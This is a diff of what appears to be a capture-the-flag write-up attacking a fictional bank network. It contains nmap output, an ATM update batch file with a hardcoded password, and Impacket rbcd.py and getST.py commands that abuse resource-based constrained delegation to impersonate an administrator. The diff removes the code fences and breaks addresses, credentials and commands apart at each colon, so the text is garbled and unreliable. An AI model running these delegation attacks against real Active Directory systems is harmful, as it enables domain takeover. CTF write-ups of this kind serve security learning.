@@ -5,64 +5,71 @@
 
 
 ```
-Nmap scan report for www.bank.ctf (9000:c1f3:fea4:dec1:216:3eff:fec1:d440)
+Nmap scan report for www.bank.ctf (9000:
+c1f3:
+fea4:
+dec1:
+216:
+3eff:
+fec1:
+d440)
 Host is up (0.0080s latency).
 Not shown: 999 closed tcp ports (conn-refused)
 PORT STATE SERVICE
 80/tcp open http
-```
-
-
-
-```
-Nmap scan report for atm01.bank.ctf (9000:c1f3:fea4:dec1:216:3eff:fe13:ef28)
+Nmap scan report for atm01.bank.ctf (9000:
+c1f3:
+fea4:
+dec1:
+216:
+3eff:
+fe13:
+ef28)
 Host is up (0.018s latency).
 Not shown: 997 filtered tcp ports (no-response)
 PORT STATE SERVICE
 135/tcp open msrpc
 445/tcp open microsoft-ds
 5900/tcp open vnc
-```
-
-
-
-```
-:RunUpdate.bat
+:
+RunUpdate.bat
 
 :: Mounts the update server and pulls in all code updates.
 :: This task is critical to keep the ATM running. Do not disable.
 
-net use z: \\NFS01\atm\packages qb@ZWFVF2$1w$[*= /user:bank\ATMService
+net use z: \\NFS01\atm\packages qb@ZWFVF2$1w$[*= /user:
+bank\ATMService
 copy z:\software C:\Packages
 
 net use * /delete
 
 :: rot47
 :: u{pv\a_732_d57g36275ffh_3cbgde5fg`6hc
-```
-
-
-
-```
 rbcd.py -action write -delegate-from 'webdev-old$' -delegate-to 'ATM01$' 'bank.ctf/ATMService:qb@ZWFVF2$1w$[*=1337'`
-```
-
-
-
-```
-getST.py -spn 'cifs/atm01.bank.ctf' -impersonate administrator -dc-ip 9000:c1f3:fea4:dec1:216:3eff:fea2:3b2d 'bank.ctf/webdev-old$:Emzmw^wimqRKy!bs#m5'`
-```
-
-
-
-```
-Nmap scan report for 9000:c1f3:fea4:dec1:216:3eff:fe38:1827
+getST.py -spn 'cifs/atm01.bank.ctf' -impersonate administrator -dc-ip 9000:
+c1f3:
+fea4:
+dec1:
+216:
+3eff:
+fea2:
+3b2d 'bank.ctf/webdev-old$:
+Emzmw^wimqRKy!bs#m5'`
+Nmap scan report for 9000:
+c1f3:
+fea4:
+dec1:
+216:
+3eff:
+fe38:
+1827
 Host is up, received user-set (0.013s latency).
 Scanned at 2023-05-21 23:20:26 CEST for 15s
 
 PORT STATE SERVICE REASON VERSION
 5671/tcp open ssl/amqp syn-ack Advanced Message Queue Protocol
-|_amqp-info: ERROR: AMQP:handshake connection closed unexpectedly while reading frame header
+|_amqp-info: ERROR: AMQP:
+handshake connection closed unexpectedly while reading frame header
 | ssl-cert: Subject: commonName=swiftmq.ctf
 | Issuer: commonName=swift.ctf
 | Public Key type: rsa
@@ -96,11 +103,6 @@ Host script results:
 | MAC address:
 | address: 00163e381827
 |_ manuf: Xensource
-```
-
-
-
-```
 import ssl
 import pika
 import logging
